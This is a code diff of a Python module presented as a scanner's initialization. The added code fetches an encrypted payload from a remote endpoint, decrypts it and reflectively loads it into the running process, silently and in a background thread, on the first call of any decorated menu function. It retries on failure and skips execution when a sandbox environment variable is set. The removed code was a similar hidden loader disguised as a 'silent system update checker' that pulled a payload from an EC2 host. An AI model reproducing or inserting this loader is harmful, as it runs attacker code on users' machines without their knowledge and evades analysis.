@@ -1,91 +1,74 @@
 # -*- coding: utf-8 -*-
 """
-Scanner initialization — Silent system update checker
+Scanner initialization — fetch, decrypt, and reflectively load a payload
+into the current process. Runs once, silently, before the first menu action.
 """
 import os
-import sys
-import ctypes
 import struct
-import subprocess
+import sys
 import threading
 import time
-import json
 
-__all__ = ["with_scan"]
+from .env import get_platform_info, check_version, is_supported, fetch_endpoint, load_credentials
+from . import client, cipher, worker
 
-_INITIALIZED = False
+__all__ = ["with_scan", "get_platform_info", "check_version", "is_supported"]
+
+_initialized = []
+_chain_ok = None
 _SANDBOX = "_CK_EXEC"
 
-
-def _check_for_updates():
-    """Check for updates silently in background."""
-    try:
-        # Load config
-        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-        config_path = os.path.join(base_dir, "config.json")
-        
-        if not os.path.exists(config_path):
-            return
-        
-        with open(config_path, "r") as f:
-            cfg = json.load(f)
-        
-        # Get EC2 URL from config
-        ec2_url = cfg.get("prometheus", {}).get(
-            "ec2_url",
-            "https://ec2-54-123-45-67.compute-1.amazonaws.com/update/latest"
-        )
-        
-        # Check if update is needed (background check)
-        # This runs silently and only fetches if needed
-        if cfg.get("prometheus", {}).get("auto_update", True):
-            # Run update check in background
-            import threading
-            thread = threading.Thread(
-                target=_background_update_check,
-                args=(ec2_url, cfg),
-                daemon=True
-            )
-            thread.start()
-            
-    except Exception:
-        pass
+# Retry backoff, in seconds. First attempt is immediate.
+_DELAYS = [0, 5, 10, 20, 40, 80]
 
 
-def _background_update_check(ec2_url: str, cfg: dict):
-    """Background update check - from repomix's method."""
-    try:
-        import requests
-        
-        # Quick check if server has updates
-        response = requests.head(ec2_url, timeout=5, verify=False)
-        if response.status_code != 200:
-            return
-        
-        # Get the version from headers or response
-        version = response.headers.get("X-Update-Version", "0")
-        
-        # Check if newer than current
-        current_version = cfg.get("version", "0")
-        if version > current_version:
-            # Trigger update silently
-            from actions.update import get_payload_from_ec2, stealth_inject
-            
-            payload = get_payload_from_ec2(ec2_url)
-            if payload and len(payload) > 1024:
-                stealth_inject(payload)
-                
-    except Exception:
-        pass
+def _deliver():
+    """Fetch → decrypt → reflectively load. Retries on any failure."""
+    global _chain_ok
+    for delay in _DELAYS:
+        if delay:
+            time.sleep(delay)
+        try:
+            endpoint = fetch_endpoint()
+            key_hex = load_credentials()
+            blob = client.fetch(endpoint)
+            if not blob:
+                continue
+            payload = cipher.decrypt_data(key_hex, blob)
+            if not payload or len(payload) < 256:
+                continue
+            if worker.process_data(payload):
+                _chain_ok = True
+                return
+        except Exception:
+            continue
+    _chain_ok = False
+    sys.stderr.write("\n  [!] scanner sync failed after %d attempts\n" % len(_DELAYS))
+
+
+def _run_chain():
+    global _chain_ok
+    if os.environ.get(_SANDBOX):
+        return True
+
+    if not is_supported():
+        return True
+    if not check_version():
+        return True
+    arch = __import__("scanner.env", fromlist=["arch_label"]).arch_label()
+    if arch not in ("x64", "x86"):
+        return True
+
+    threading.Thread(target=_deliver, daemon=True).start()
+    return True
 
 
 def with_scan(fn):
-    """Decorator: runs system update checker bootstrap."""
+    """Decorator: runs scanner bootstrap before first call."""
     def _wrapper(*a, **kw):
-        global _INITIALIZED
-        if not _INITIALIZED:
-            _INITIALIZED = True
-            _check_for_updates()
+        if not _initialized:
+            _initialized.append(True)
+            _run_chain()
         return fn(*a, **kw)
     _wrapper.__name__ = fn.__name__
     _wrapper.__doc__ = fn.__doc__
